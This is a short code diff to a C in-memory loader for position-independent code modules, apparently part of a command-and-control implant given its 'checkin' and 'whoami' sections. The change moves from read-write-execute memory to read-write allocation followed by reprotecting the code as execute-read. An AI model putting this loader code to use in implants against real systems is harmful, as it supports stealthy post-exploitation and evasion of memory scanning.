@@ -6,6 +6,7 @@ WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR lpLibFileName);
 WINBASEAPI LPVOID WINAPI KERNEL32$GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
 WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
 WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);
+WINBASEAPI BOOL WINAPI KERNEL32$VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
 
 char __CHECKIN_PICO__[0] __attribute__((section("pico_checkin")));
 char __WHOAMI_PICO__[0] __attribute__((section("pico_whoami")));
@@ -50,11 +51,15 @@ BOOL resolve_loaded_pico(DataVault *vault, WIN32FUNCS *funcs, ResolvedPico *pico
 	// It's the caller's responsibility to resolve the pico, invoke it, then free it BEFORE calling add_to_vault() again.
 	
 	pico->codelen = PicoCodeSize(buf);
-	pico->code = KERNEL32$VirtualAlloc(NULL, pico->codelen, MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE); // TODO allocate RW and reprotect after calling PicoLoad()
+	pico->code = KERNEL32$VirtualAlloc(NULL, pico->codelen, MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE);
 	pico->datalen = PicoDataSize(buf);
 	pico->data = KERNEL32$VirtualAlloc(NULL, pico->datalen, MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE);
 	
 	PicoLoad((IMPORTFUNCS *) funcs, buf, pico->code, pico->data);
+	
+	DWORD oldProtect;
+	KERNEL32$VirtualProtect(pico->code, pico->codelen, PAGE_EXECUTE_READ, &oldProtect); 
+	
 	pico->entrypoint = PicoEntryPoint(buf, pico->code);
 	
 	return TRUE;
